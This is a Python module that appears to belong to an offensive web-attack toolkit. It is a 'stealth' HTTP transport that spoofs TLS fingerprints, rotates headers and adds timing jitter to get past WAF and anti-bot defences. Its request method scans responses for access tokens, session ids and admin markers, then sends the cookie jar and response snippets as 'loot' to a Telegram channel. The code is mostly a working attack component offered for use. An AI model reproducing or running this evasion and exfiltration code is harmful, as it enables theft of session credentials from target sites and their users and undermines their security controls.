#!/usr/bin/env python3
"""
TRANSPORT.PY v8.5 — Centralized Stealth HTTP, TLS Evasion & Behavioral Middleware
Features:
- Advanced TLS spoofing (JA3/JA4 fingerprint evasion via spoofed SSL contexts)
- Poisson behavioral timing jitter and randomized browser client hints
- Robust cookie-jar state synchronization & header rotation
- Resilient connection error handling with jittered retry loops
- Real-time unredacted Telegram telemetry dispatch
"""
import http.client
import json
import ssl
import socket
import time
import asyncio
import random
from urllib.parse import urlsplit

# Import advanced evasion, behavioral modules, and Telegram notifier
from modules.tls_evasion import create_spoofed_ssl_context
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.telegram_notifier import send_telegram_alert

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous transport methods."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

class SecureTransport:
    def __init__(self, target_url):
        parsed = urlsplit(target_url)
        self.host = parsed.hostname
        self.secure = parsed.scheme == "https"
        self.port = parsed.port or (443 if self.secure else 80)
        self.base_path = parsed.path.rstrip("/")
        self.cookie_jar = {}

    def update_cookies(self, set_cookie_header):
        if not set_cookie_header:
            return
        if isinstance(set_cookie_header, str):
            for cookie in set_cookie_header.split(","):
                part = cookie.split(";")[0].strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                        self.cookie_jar[k.strip()] = v.strip()
        elif isinstance(set_cookie_header, dict):
            self.cookie_jar.update(set_cookie_header)

    def get_cookie_header_value(self):
        if not self.cookie_jar:
            return ""
        if isinstance(self.cookie_jar, dict):
            return "; ".join([f"{k}={v}" for k, v in self.cookie_jar.items()])
        return str(self.cookie_jar)

    def request(self, method, path, payload=None, extra_headers=None, retries=3):
        # Inject randomized human-like velocity jitter to defeat anti-bot limiters
        apply_behavioral_jitter()

        endpoint = f"{self.base_path}{path}" if not path.startswith(self.base_path) else path
        
        headers = {
            "Host": self.host,
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close"
        }

        # Inject randomized browser client hints & evasive headers
        headers.update(get_randomized_hints())

        cookie_str = self.get_cookie_header_value()
        if cookie_str:
            headers["Cookie"] = cookie_str

        if extra_headers:
            headers.update(extra_headers)

        body = None
        if payload:
            body = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"

        # Retry loop to handle abrupt WAF socket drops and TLS EOF errors gracefully
        for attempt in range(retries):
            conn = None
            try:
                if self.secure:
                    # Use browser-grade TLS spoofed context to bypass JA3/JA4 edge blocks
                    ctx = create_spoofed_ssl_context()
                    conn = http.client.HTTPSConnection(self.host, self.port, timeout=10, context=ctx)
                else:
                    conn = http.client.HTTPConnection(self.host, self.port, timeout=10)

                conn.request(method, endpoint, body=body, headers=headers)
                res = conn.getresponse()
                data = res.read(512 * 1024).decode("utf-8", errors="replace")
                resp_headers = {k.lower(): v for k, v in res.getheaders()}

                # Automatically capture any new Set-Cookie headers
                if "set-cookie" in resp_headers:
                    self.update_cookies(resp_headers["set-cookie"])

                # Check for high-value authentication or session tokens in successful transport responses
                body_lower = data.lower()
                if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
                    transport_loot = {
                        "endpoint": f"https://{self.host}{endpoint}",
                        "status": res.status,
                        "cookie_jar": self.get_cookie_header_value(),
                        "response_snippet": data[:300]
                    }
                    broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)

                return res.status, resp_headers, data

            except (ssl.SSLError, socket.timeout, ConnectionError, OSError):
                if attempt < retries - 1:
                    time.sleep(0.4 * (attempt + 1))
                    continue
                return 0, {}, ""
            except Exception:
                return 0, {}, ""
            finally:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        pass
        return 0, {}, ""
